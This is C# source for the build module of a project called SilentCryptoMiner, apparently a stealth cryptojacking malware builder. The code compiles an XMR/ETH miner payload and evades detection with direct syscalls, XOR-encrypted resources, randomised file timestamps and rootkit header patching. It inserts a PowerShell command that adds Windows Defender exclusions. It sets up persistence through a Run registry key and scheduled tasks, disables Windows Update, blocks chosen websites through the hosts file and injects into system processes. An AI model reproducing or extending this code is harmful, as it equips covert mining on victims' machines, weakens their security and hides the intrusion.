using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace SilentCryptoMiner
{
    public class Codedom
    {
        public static Builder F;

        public static bool NativeCompiler(string savePath, string mainFileCode, string compilerCommand, string icoPath = "", bool assemblyData = false)
        {
            try
            {
                string curDir = Path.GetDirectoryName(savePath);
                string gccDir = Path.Combine(curDir, @"UCompilers\gcc\bin");
                string logDir = Path.Combine(curDir, @"UCompilers\logs");
                string filename = Path.Combine(curDir, @"UFiles\main");

                var resource = new StringBuilder(Properties.Resources.resource);
                string defs = "";
                if (!string.IsNullOrEmpty(icoPath))
                {
                    resource.Replace("#ICON", ToLiteral(icoPath));
                    defs += " -DDefIcon";
                }

                if (assemblyData)
                {
                    resource.Replace("#TITLE", ToLiteral(F.txtAssemblyTitle.Text));
                    resource.Replace("#DESCRIPTION", ToLiteral(F.txtAssemblyDescription.Text));
                    resource.Replace("#COMPANY", ToLiteral(F.txtAssemblyCompany.Text));
                    resource.Replace("#PRODUCT", ToLiteral(F.txtAssemblyProduct.Text));
                    resource.Replace("#COPYRIGHT", ToLiteral(F.txtAssemblyCopyright.Text));
                    resource.Replace("#TRADEMARK", ToLiteral(F.txtAssemblyTrademark.Text));
                    resource.Replace("#VERSION", string.Join(",", new string[] { 
                        SanitizeNumber(F.txtAssemblyVersion1.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion2.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion3.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion4.Text).ToString()
                    }));
                    defs += " -DDefAssembly";
                }

                File.WriteAllText($"{curDir}\\UFiles\\resource.rc", resource.ToString());
                RunExternalProgram($"{gccDir}\\windres.exe", $"--input UFiles\\resource.rc --output UFiles\\resource.o -O coff --codepage=65001 {defs}", curDir, curDir, $"{logDir}\\windres.log");
                if (F.BuildError(!File.Exists($"{curDir}\\UFiles\\resource.o"), string.Format("Error: Failed at compiling resources, check the error log at {0}.", $"{logDir}\\windres.log")))
                    return false;

                RunExternalProgram($"{curDir}\\UCompilers\\SysWhispersU\\SysWhispersU.exe", $"-a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtClose,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation,NtQueryInformationToken,NtOpenKey,NtCreateKey,NtEnumerateKey,NtQueryValueKey,NtRenameKey,NtTerminateProcess,NtProtectVirtualMemory,NtSetValueKey -o \"UFiles\\Syscalls\\syscalls\"", curDir, curDir, $"{logDir}\\SysWhispersU.log");
                File.WriteAllText(filename + ".cpp", ReplaceGlobals(mainFileCode));
                RunExternalProgram($"{gccDir}\\g++.exe", compilerCommand, gccDir, curDir, $"{logDir}\\g++.log");
                if (F.BuildError(!File.Exists(savePath), string.Format("Error: Failed at compiling program, check the error log at {0}.", $"{logDir}\\g++.log")))
                    return false;

                RunExternalProgram($"{gccDir}\\strip.exe", $"\"{savePath}\"", gccDir, curDir, $"{logDir}\\strip.log");
                SetRandomFileDates(savePath);

                MakeRootkitHelper(savePath);
                if(F.chkSignature.Checked && !string.IsNullOrEmpty(F.txtSignatureData.Text))
                {
                    F.WriteSignature(Convert.FromBase64String(F.txtSignatureData.Text), savePath);
                }
            }
            catch (Exception ex)
            {
                F.BuildError(true, "Error: An error occured while compiling the file: " + ex.Message);
                return false;
            }
            return true;
        }

        public static bool CheckerCompiler(string savePath)
        {
            var codeProvider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } });
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = savePath,
                CompilerOptions = $" /target:exe /platform:x64 /optimize /win32manifest:\"{Path.Combine(Path.GetDirectoryName(savePath), "UFiles\\program.manifest")}\"",
                IncludeDebugInformation = false,
                ReferencedAssemblies = { "System.dll", "System.Management.dll", "System.Core.dll" }
            };


            var results = codeProvider.CompileAssemblyFromSource(parameters, ReplaceGlobals(Properties.Resources.Checker));

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line: {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            MakeRootkitHelper(savePath);
            SetRandomFileDates(savePath);
            return true;
        }

        public static bool UninstallerCompiler(string savePath)
        {
            string resources = Path.Combine(Path.GetDirectoryName(savePath), "UFiles\\uninstaller.resources");
            var codeProvider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } });
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = savePath,
                CompilerOptions = $" /target:winexe /platform:x64 /optimize /win32manifest:\"{Path.Combine(Path.GetDirectoryName(savePath), "UFiles\\program.manifest")}\"",
                IncludeDebugInformation = false,
                ReferencedAssemblies = { "System.dll", "System.Management.dll", "System.Core.dll" }
            };

            if (F.FormAO.toggleRootkit.Checked)
            {
                using (var R = new System.Resources.ResourceWriter(resources))
                {
                    R.AddResource("rootkit_u", Properties.Resources.Uninstall64);
                    R.Generate();
                }
                parameters.EmbeddedResources.Add(resources);
            }

            var results = codeProvider.CompileAssemblyFromSource(parameters, ReplaceGlobals(Properties.Resources.Uninstaller));
            
            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            MakeRootkitHelper(savePath);
            SetRandomFileDates(savePath);
            return true;
        }

        public static void MakeRootkitHelper(string savePath)
        {
            if (F.FormAO.toggleRootkit.Checked)
            {
                byte[] newFile = File.ReadAllBytes(savePath);
                Buffer.BlockCopy(BitConverter.GetBytes(0x7268), 0, newFile, 64, 2);
                File.WriteAllBytes(savePath, newFile);
            }
        }

        public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string pathBase, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.EnvironmentVariables["PATH"] = $"{pathBase};{pathBase}\\UCompilers\\gcc\\bin;{process.StartInfo.EnvironmentVariables["PATH"]}";
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public static void CreateResource(StringBuilder output, string name, byte[] data)
        {
            if(data.Length == 0){
                output.AppendLine($"long {name}Size = AYU_OBFC(0);");
                output.AppendLine($"unsigned char {name}[] = {{ }};");
                return;
            }

            byte[] encryptedData1 = Cipher(data, F.CipherKey);
            string encodedData = Convert.ToBase64String(encryptedData1);
            byte[] encryptedData2 = Cipher(Encoding.ASCII.GetBytes(encodedData), F.CipherKey);

            output.AppendLine($"long {name}Size = AYU_OBFC({encryptedData2.Length});");
            output.AppendLine($"unsigned char {name}[] = {{ {string.Join(",", encryptedData2)} }};");
        }

        public static byte[] Cipher(byte[] data, string key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        public static int SanitizeNumber(string input)
        {
            string sanitized = new string(input.Where(char.IsDigit).ToArray());
            return string.IsNullOrEmpty(sanitized) ? 0 : int.Parse(sanitized);
        }

        public static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public static string ReplaceEscape(string input)
        {
            return input.Replace(@"\", @"\\").Replace(@"""", @"\""");
        }

        public static void SetRandomFileDates(string filePath)
        {
            DateTime now = DateTime.Now;
            Random rnd = new Random();
            DateTime randomDate = now.AddYears(-3).AddDays(rnd.Next((now.AddMonths(-3) - now.AddYears(-3)).Days));

            File.SetLastWriteTime(filePath, randomDate);
            File.SetCreationTime(filePath, randomDate);
        }

        public static void SetDefine(StringBuilder sb, string key, bool condition)
        {
            sb.Replace(key, condition ? "true" : "false");
        }

        public static string ReplaceGlobals(string code)
        {
            StringBuilder stringb = new StringBuilder(code);

            if (F.toggleWDExclusions.Checked)
            {
                stringb.Replace("DefWDExclusions", "true");
                stringb.Replace("#WDCOMMAND", $"Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramData) -ExclusionExtension '.exe' -Force");
            }
            
            SetDefine(stringb, "DefMineXMR", F.mineXMR);
            SetDefine(stringb, "DefMineETH", F.mineETH);
            SetDefine(stringb, "DefRootkit", F.FormAO.toggleRootkit.Checked);
            SetDefine(stringb, "DefDisableSleep", F.toggleDisableSleep.Checked);
            SetDefine(stringb, "DefDisableWindowsUpdate", F.toggleWindowsUpdate.Checked);
            SetDefine(stringb, "DefProcessProtect", F.toggleProcessProtect.Checked);
            SetDefine(stringb, "DefRunAsAdministrator", F.toggleAdministrator.Checked);

            if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
            {
                stringb.Replace("DefBlockWebsites", "true");

                string[] domainList = F.txtBlockWebsites.Text.Split(',');
                stringb.Replace("$DOMAINSETSIZE", domainList.Length.ToString());
                stringb.Replace("$CSDOMAINSET", $"\" {string.Join("\", \" ", domainList)}\"");
                stringb.Replace("$CPPDOMAINSET", string.Join("\n            ", domainList.Select(domain => $"add_to_hosts((char*)hostsData, &hostsFileSize, AYU_OBFA(\" {domain}\"), AYU_OBFC({domain.Length+16}));")));
                stringb.Replace("$DOMAINSIZE", (F.txtBlockWebsites.Text.Replace(",", "").Length + domainList.Length * 16).ToString());
            }

            if (int.Parse(F.txtStartDelay.Text) > 0)
            {
                stringb.Replace("DefStartDelay", "true");
                stringb.Replace("$STARTDELAY", F.txtStartDelay.Text + "000");
            }

            if (F.chkStartup.Checked)
            {
                stringb.Replace("DefStartup", "true");
                string installdir;
                string basedir;
                switch (F.Invoke(new Func<string>(() => F.txtStartupPath.Text)) ?? "")  
                {                  
                    case "UserProfile":
                        installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
                        basedir = "USERPROFILE=";
                        break;

                    case "AppData":
                    default:
                        installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                        basedir = "APPDATA=";
                        break;
                }

                stringb.Replace("$BASEDIR", basedir);
                stringb.Replace("PayloadAdminPath", $"System.IO.Path.Combine({installdir}, \"{ToLiteral(F.txtStartupFileName.Text)}\")");
                stringb.Replace("PayloadUserPath", $"System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), \"{ToLiteral(F.txtStartupFileName.Text)}\")");

                stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));
                
                SetDefine(stringb, "DefWatchdog", F.toggleWatchdog.Checked);
                SetDefine(stringb, "DefAutoDelete", F.toggleAutoDelete.Checked);
                SetDefine(stringb, "DefRunInstall", F.FormAO.toggleRunInstall.Checked);
            }

            stringb.Replace("$CHECKERSET", string.Join(", ", F.checkerSet));
            stringb.Replace("$MUTEXSET", string.Join(", ", F.mutexSet));
            stringb.Replace("$INJECTIONTARGETS", "\"" + string.Join("\", \"", F.injectionTargets.Distinct().ToList()) + "\"");

            stringb.Replace("#WATCHDOGID", F.watchdogID);
            stringb.Replace("#MUTEXMINER", F.Randomi(24, true));

            stringb.Replace("#STARTUPADDUSER", ReplaceEscape($"add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d \"%S\""));
            stringb.Replace("#STARTUPSTARTADMIN", ReplaceEscape($"/run /tn \"{F.txtStartupEntryName.Text}\""));

            stringb.Replace("#STARTUPENTRYNAME", ReplaceEscape(F.txtStartupEntryName.Text));
            
            stringb.Replace("#CONHOSTPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");

            stringb.Replace("#WINRINGNAME", F.winringName);

            return stringb.ToString();
        }
    }
}